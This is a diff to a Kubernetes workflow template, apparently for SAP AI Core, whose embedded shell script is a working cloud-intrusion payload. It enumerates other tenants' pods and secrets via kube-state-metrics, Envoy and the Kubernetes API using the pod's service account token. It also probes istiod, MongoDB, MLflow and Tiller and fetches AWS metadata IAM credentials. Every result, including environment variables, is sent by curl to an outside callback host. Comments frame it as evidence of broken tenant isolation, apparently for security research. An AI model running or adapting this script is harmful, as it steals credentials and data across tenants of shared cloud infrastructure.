@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "9.0.1"
+    ai.sap.com/version: "10.0.0"
 spec:
   entrypoint: main
   templates:
@@ -28,79 +28,215 @@ spec:
         post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
         get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
 
-        get "recon9-start-$(hostname)"
+        get "esc1-start-$(hostname)-$(date +%s)"
 
-        # === 1. TARGETED SCAN: Find MongoDB and Tiller IPs ===
-        nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,15014 100.104.0.0/24 -oG /tmp/targeted.txt 2>&1 | tail -3 | post "recon9-targeted-summary"
-        grep "Ports:" /tmp/targeted.txt | post "recon9-targeted-hosts"
+        # ============================================================
+        # EVIDENCE 1: CROSS-TENANT POD ENUMERATION VIA KSM
+        # Proves tenant isolation broken - see OTHER tenants' pods
+        # ============================================================
+        curl -s --connect-timeout 10 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_pods.txt 2>&1
+        echo "ksm_pods_bytes=$(wc -c < /tmp/ksm_pods.txt)" | post "esc1-ksm-pods-size"
 
-        # === 2. MONGODB PROBE ===
-        MONGO_IP=$(grep "27017/open" /tmp/targeted.txt | head -1 | awk '{print $2}')
-        echo "mongo_ip=${MONGO_IP}" | post "recon9-mongo-ip"
+        # ALL unique namespaces visible (cross-tenant proof)
+        grep -oE 'namespace="[^"]*"' /tmp/ksm_pods.txt | sort -u | post "esc1-ksm-all-namespaces"
 
-        if [ -n "$MONGO_IP" ]; then
-          curl -s --connect-timeout 3 "http://${MONGO_IP}:28017/" 2>&1 | head -c 700 | post "recon9-mongo-http"
-          timeout 10 mongosh --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-listdb"
-          timeout 10 mongo --host ${MONGO_IP} --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1 | head -c 1800 | post "recon9-mongo-legacy"
-          echo "" | timeout 5 ncat ${MONGO_IP} 27017 2>&1 | xxd | head -c 700 | post "recon9-mongo-banner"
+        # Pod count per namespace
+        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "esc1-ksm-pods-per-namespace"
+
+        # Our namespace
+        MY_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
+        echo "my_namespace=${MY_NS}" | post "esc1-my-namespace"
+
+        # OTHER TENANTS' pods
+        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | head -30 | post "esc1-ksm-other-tenant-pods-1"
+        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | sed -n '30,60p' | post "esc1-ksm-other-tenant-pods-2"
+        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | sed -n '60,90p' | post "esc1-ksm-other-tenant-pods-3"
+
+        # Pod images across namespaces
+        grep -oE 'image="[^"]*"' /tmp/ksm_pods.txt | sort -u | post "esc1-ksm-all-images"
+
+        # Secrets visible
+        grep "kube_secret_info\|kube_secret_metadata" /tmp/ksm_pods.txt | head -40 | post "esc1-ksm-secrets"
+
+        # Node info
+        grep "kube_node_info" /tmp/ksm_pods.txt | head -10 | post "esc1-ksm-node-info"
+
+        # CronJobs (cross-tenant)
+        grep "kube_cronjob_" /tmp/ksm_pods.txt | head -30 | post "esc1-ksm-cronjobs"
+
+        # Custom KSM
+        curl -s --connect-timeout 10 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_custom.txt 2>&1
+        wc -c < /tmp/ksm_custom.txt | post "esc1-ksm-custom-size"
+        grep -oE 'namespace="[^"]*"' /tmp/ksm_custom.txt | sort -u | post "esc1-ksm-custom-namespaces"
+
+        # Multi KSM
+        curl -s --connect-timeout 10 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_multi.txt 2>&1
+        wc -c < /tmp/ksm_multi.txt | post "esc1-ksm-multi-size"
+        grep -oE 'namespace="[^"]*"' /tmp/ksm_multi.txt | sort -u | post "esc1-ksm-multi-namespaces"
+        grep "kube_pod_info\|kube_secret\|kube_configmap" /tmp/ksm_multi.txt | head -40 | post "esc1-ksm-multi-resources"
+
+        # ============================================================
+        # EVIDENCE 2: ENVOY SERVICE MESH - FULL CLUSTER TOPOLOGY
+        # ============================================================
+        curl -s localhost:15000/clusters > /tmp/envoy_clusters.txt 2>&1
+        echo "envoy_clusters_bytes=$(wc -c < /tmp/envoy_clusters.txt)" | post "esc1-envoy-clusters-size"
+
+        # All services across ALL namespaces
+        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy_clusters.txt | sort -u | post "esc1-envoy-all-services"
+
+        # Namespaces from Envoy
+        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy_clusters.txt | sed 's/[^.]*\.\([^.]*\)\..*/\1/' | sort -u | post "esc1-envoy-namespaces"
+
+        # Envoy config dump
+        curl -s localhost:15000/config_dump > /tmp/envoy_config.txt 2>&1
+        wc -c < /tmp/envoy_config.txt | post "esc1-envoy-config-size"
+
+        # Extract routes
+        python3 -c "
+        import json
+        with open('/tmp/envoy_config.txt') as f:
+            data = json.load(f)
+        for c in data.get('configs',[]):
+            if 'dynamic_listeners' in c:
+                for l in c['dynamic_listeners'][:10]:
+                    print('listener:', l.get('name','?'))
+            if 'dynamic_route_configs' in c:
+                for r in c['dynamic_route_configs'][:10]:
+                    rc = r.get('route_config',{})
+                    for vh in rc.get('virtual_hosts',[])[:20]:
+                        print(f'route: {vh.get(\"name\",\"?\")}: domains={vh.get(\"domains\",[])[:3]}')
+        " 2>&1 | post "esc1-envoy-routes"
+
+        curl -s localhost:15000/server_info 2>&1 | head -c 1500 | post "esc1-envoy-server-info"
+        curl -s localhost:15000/listeners 2>&1 | head -c 1500 | post "esc1-envoy-listeners"
+
+        # ============================================================
+        # EVIDENCE 3: KUBERNETES API & SERVICE ACCOUNT PERMISSIONS
+        # ============================================================
+        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+        echo "sa_token_length=${#SA_TOKEN}" | post "esc1-sa-token-length"
+
+        if [ -n "$SA_TOKEN" ]; then
+          echo "$SA_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | post "esc1-sa-token-claims"
+
+          K8S="https://kubernetes.default.svc"
+          AUTH="Authorization: Bearer ${SA_TOKEN}"
+
+          # List pods in our namespace
+          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/pods" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-our-pods"
+
+          # List ALL pods (cross-tenant)
+          curl -sk "${K8S}/api/v1/pods" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-all-pods"
+
+          # List namespaces
+          curl -sk "${K8S}/api/v1/namespaces" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-namespaces"
+
+          # Secrets in our namespace
+          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/secrets" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-our-secrets"
+
+          # ALL secrets
+          curl -sk "${K8S}/api/v1/secrets" -H "${AUTH}" 2>&1 | head -c 3000 | post "esc1-k8s-all-secrets"
+
+          # RBAC self-check
+          curl -sk "${K8S}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+            -H "${AUTH}" -H "Content-Type: application/json" \
+            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${MY_NS}\"}}" 2>&1 | head -c 3000 | post "esc1-k8s-rbac"
+
+          # Cluster version
+          curl -sk "${K8S}/version" -H "${AUTH}" 2>&1 | post "esc1-k8s-version"
+
+          # Try other tenant namespaces
+          for ns in istio-system kube-system opentelemetry dynatrace; do
+            curl -sk "${K8S}/api/v1/namespaces/${ns}/pods" -H "${AUTH}" 2>&1 | head -c 2000 | post "esc1-k8s-${ns}-pods"
+          done
         fi
 
-        # === 3. TILLER PROBE (port 44134) ===
-        TILLER_IP=$(grep "44134/open" /tmp/targeted.txt | head -1 | awk '{print $2}')
-        echo "tiller_ip=${TILLER_IP}" | post "recon9-tiller-ip"
-
-        if [ -n "$TILLER_IP" ]; then
-          curl -s --connect-timeout 3 "http://${TILLER_IP}:44134/" 2>&1 | head -c 700 | post "recon9-tiller-http"
-          which grpcurl 2>&1 | post "recon9-grpcurl-check"
-          grpcurl -plaintext ${TILLER_IP}:44134 list 2>&1 | head -c 700 | post "recon9-tiller-grpc"
-          echo "" | timeout 3 ncat ${TILLER_IP} 44134 2>&1 | xxd | head -c 700 | post "recon9-tiller-banner"
-          which helm 2>&1 | post "recon9-helm-check"
-        fi
-
-        # === 4. ISTIOD PROBE (port 15014) ===
-        ISTIOD_IP=$(grep "15014/open" /tmp/targeted.txt | head -1 | awk '{print $2}')
-        echo "istiod_ip=${ISTIOD_IP}" | post "recon9-istiod-ip"
+        # ============================================================
+        # EVIDENCE 4: ISTIOD CONTROL PLANE
+        # ============================================================
+        ISTIOD_IP=$(dig +short istiod.istio-system.svc.cluster.local @100.104.0.10 2>/dev/null | head -1)
+        echo "istiod_ip=${ISTIOD_IP}" | post "esc1-istiod-ip"
 
         if [ -n "$ISTIOD_IP" ]; then
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/configz" 2>&1 | head -c 1800 | post "recon9-istiod-configz"
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/endpointz" 2>&1 | head -c 1800 | post "recon9-istiod-endpointz"
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/registryz" 2>&1 | head -c 1800 | post "recon9-istiod-registryz"
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/syncz" 2>&1 | head -c 1800 | post "recon9-istiod-syncz"
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:15014/debug/authorizationz" 2>&1 | head -c 1800 | post "recon9-istiod-authz"
-          curl -s --connect-timeout 3 "http://${ISTIOD_IP}:8080/debug/configz" 2>&1 | head -c 700 | post "recon9-istiod-8080"
+          for ep in configz endpointz registryz syncz authorizationz; do
+            curl -s --connect-timeout 5 "http://${ISTIOD_IP}:15014/debug/${ep}" 2>&1 | head -c 3000 | post "esc1-istiod-${ep}"
+          done
+          curl -s --connect-timeout 5 "http://${ISTIOD_IP}:15014/metrics" 2>&1 | grep -i "pilot\|mesh\|proxy" | head -30 | post "esc1-istiod-metrics"
         fi
 
-        # === 5. EXTENDED PORT SCAN (just hot ports, wider ranges) ===
-        for i in 1 2 3 4 5 7 8 9 10 50 100 150 178 200; do
-          nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,2379,3100,5432,6379,9200 100.104.${i}.0/24 -oG - 2>/dev/null | grep "Ports:" >> /tmp/extended.txt
+        # ============================================================
+        # EVIDENCE 5: MONGODB / MLFLOW / INTERNAL SERVICES
+        # ============================================================
+        MONGO_IP=$(dig +short "mongodb.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+        echo "mongodb_ip=${MONGO_IP}" | post "esc1-mongodb-ip"
+        if [ -n "$MONGO_IP" ]; then
+          echo "" | timeout 5 ncat ${MONGO_IP} 27017 2>&1 | xxd | head -20 | post "esc1-mongodb-banner"
+        fi
+
+        MLFLOW_IP=$(dig +short "mlflow.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+        echo "mlflow_ip=${MLFLOW_IP}" | post "esc1-mlflow-ip"
+        if [ -n "$MLFLOW_IP" ]; then
+          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/experiments/list" 2>&1 | head -c 2000 | post "esc1-mlflow-experiments"
+          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/registered-models/list" 2>&1 | head -c 2000 | post "esc1-mlflow-models"
+        fi
+
+        TILLER_IP=$(dig +short "tiller-deploy.kube-system.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+        echo "tiller_ip=${TILLER_IP}" | post "esc1-tiller-ip"
+        if [ -n "$TILLER_IP" ]; then
+          echo "" | timeout 5 ncat ${TILLER_IP} 44134 2>&1 | xxd | head -20 | post "esc1-tiller-banner"
+        fi
+
+        # ============================================================
+        # EVIDENCE 6: OTEL COLLECTORS (cross-tenant metrics)
+        # ============================================================
+        for svc in otel-collector otel-collector-opentelemetry-collector opentelemetry-collector; do
+          OTEL_IP=$(dig +short "${svc}.opentelemetry.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+          if [ -n "$OTEL_IP" ]; then
+            echo "${svc}=${OTEL_IP}" | post "esc1-otel-${svc}-ip"
+            curl -s --connect-timeout 5 "http://${OTEL_IP}:8888/metrics" 2>&1 | head -c 2000 | post "esc1-otel-${svc}-metrics"
+          fi
         done
-        wc -l /tmp/extended.txt 2>/dev/null | post "recon9-extended-count"
-        cat /tmp/extended.txt 2>/dev/null | head -c 1800 | post "recon9-extended-open"
 
-        # === 6. POD SUBNET ===
-        MY_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
-        MY_NET=$(echo $MY_IP | sed 's/\.[0-9]*$/.0/')
-        echo "pod_ip=${MY_IP}" | post "recon9-pod-ip"
-        nmap -sT -T4 --open --min-rate 1000 -p 27017,44134,2379,3100,8080,9200 ${MY_NET}/24 -oG - 2>/dev/null | grep "Ports:" | head -c 1800 | post "recon9-pod-subnet"
+        # ============================================================
+        # EVIDENCE 7: AWS IMDS
+        # ============================================================
+        TOKEN_IMDS=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
+        if [ ${#TOKEN_IMDS} -gt 10 ]; then
+          echo "imds_v2_available=true" | post "esc1-imds-v2"
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-iam-roles"
+          ROLE=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | head -1)
+          if [ -n "$ROLE" ] && [ "$ROLE" != "<?xml"* ]; then
+            curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-iam-creds"
+          fi
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/info" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-iam-info"
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/dynamic/instance-identity/document" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc1-imds-instance-doc"
+        else
+          # Try IMDSv1
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 500 | post "esc1-imds-v1"
+        fi
 
-        # === 7. KSM FULL DUMP ===
-        curl -s --connect-timeout 10 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_pods.txt 2>&1
-        wc -c /tmp/ksm_pods.txt | post "recon9-ksm-pods-size"
-        grep "kube_pod_info" /tmp/ksm_pods.txt | head -20 | head -c 1800 | post "recon9-ksm-pod-info-1"
-        grep "kube_pod_info" /tmp/ksm_pods.txt | sed -n '20,40p' | head -c 1800 | post "recon9-ksm-pod-info-2"
-        grep "kube_secret" /tmp/ksm_pods.txt | head -c 1800 | post "recon9-ksm-secrets"
-        grep -oE 'namespace="[^"]*"' /tmp/ksm_pods.txt | sort -u | head -c 1800 | post "recon9-ksm-namespaces"
+        # ============================================================
+        # EVIDENCE 8: NETWORK + ENVIRONMENT
+        # ============================================================
+        curl -s --connect-timeout 5 "http://ifconfig.me" 2>&1 | post "esc1-egress-ip"
+        env | sort | post "esc1-env-all"
+        cat /etc/resolv.conf 2>&1 | post "esc1-resolv-conf"
+        ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | post "esc1-sa-dir"
+        cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1 | post "esc1-sa-namespace"
 
-        curl -s --connect-timeout 10 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_custom.txt 2>&1
-        wc -c /tmp/ksm_custom.txt | post "recon9-ksm-custom-size"
-        grep -i "secret\|cert\|key\|credential\|token" /tmp/ksm_custom.txt | head -c 1800 | post "recon9-ksm-custom-secrets"
+        # Mounted volumes
+        mount | post "esc1-mounts"
+        df -h | post "esc1-disk"
 
-        curl -s --connect-timeout 10 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_multi.txt 2>&1
-        wc -c /tmp/ksm_multi.txt | post "recon9-ksm-multi-size"
-        grep "kube_secret_info\|kube_configmap_info" /tmp/ksm_multi.txt | head -c 1800 | post "recon9-ksm-multi-secrets"
-        grep -oE 'namespace="[^"]*"' /tmp/ksm_multi.txt | sort -u | head -c 700 | post "recon9-ksm-multi-ns"
+        # Process list (see what else runs in the pod)
+        ps aux 2>&1 | post "esc1-processes"
 
-        get "recon9-done-$(hostname)"
+        # Network interfaces and routing
+        ip addr 2>&1 | post "esc1-ip-addr"
+        ip route 2>&1 | post "esc1-ip-route"
+        cat /etc/hosts 2>&1 | post "esc1-hosts"
+
+        get "esc1-complete-$(hostname)-$(date +%s)"
       resources:
         limits:
           cpu: "2"
